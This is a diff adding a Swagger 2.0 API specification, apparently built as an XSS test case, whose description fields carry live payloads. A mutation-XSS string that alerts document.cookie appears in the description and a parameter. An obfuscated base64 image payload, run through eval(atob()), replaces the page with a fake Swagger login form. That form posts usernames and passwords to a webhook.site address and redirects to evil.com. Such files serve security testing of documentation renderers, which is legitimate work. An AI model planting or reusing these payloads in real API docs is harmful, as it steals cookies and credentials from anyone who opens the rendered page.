@@ -1,0 +1,53 @@
+swagger: '2.0'
+info:
+  title: XSS Attack BY Combined
+  description: |
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1>"></form>
+    
+    Below is a test point:
+    
+    <div>
+    <table>
+      <tr><td><b>Endpoint:</b></td><td>/hack/hachid/{id}</td></tr>
+      <tr><td><b>Method:</b></td><td>DELETE</td></tr>
+    </table>
+    
+    <br><br>
+    
+    <!-- XSS Executed to show login form -->
+    <img src=x id='ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9Jyc7IHZhciBhPWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2Zvcm0nKTthLmFjdGlvbj0iaHR0cHM6Ly93ZWJob29rLnNpdGUvN2Y4MTAzMjUtZDRkYi00OGViLThiMjctNzQzMjViNDQ2ZTliIjthLm1ldGhvZD0nUE9TVCc7YS5vbnN1Ym1pdD1mdW5jdGlvbigpe3dpbmRvdy5sb2NhdGlvbi5ocmVmPSJodHRwOi8vZXZpbC5jb20iIH07YS5pbm5lckhUTUw9JzxjZW50ZXI+PGI+RkFLRSBTd2FnZ2VyIExvZ2luPC9iPjxicj5Vc2VybmFtZTogPGlucHV0IG5hbWU9InVzZXJOYW1lIj48YnI+UGFzc3dvcmQ6IDxpbnB1dCB0eXBlPSJwYXNzd29yZCIgbmFtZT0icHdkIj48YnI+PGlucHV0IHR5cGU9InN1Ym1pdCIgdmFx1ZT0iTG9naW4iPjwvY2VudGVyPic7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs=' onerror='eval(atob(this.id))'>
+    
+    </div>
+  version: production
+basePath: /JSSResource/
+produces:
+  - application/xml
+  - application/json
+consumes:
+  - application/xml
+  - application/json
+security:
+  - basicAuth: []
+paths:
+  /Combined_XSS:
+    get:
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+        - Combined_XSS_D
+      operationId: findAccounts
+      summary: Finds all accounts
+  '/hack/hachid/{id}':
+    delete:
+      parameters:
+        - description: |
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1>"></form>
+          format: int64
+          in: path
+          name: id
+          required: true
+          type: integer
+      responses:
+        '200':
+          description: No response was specified
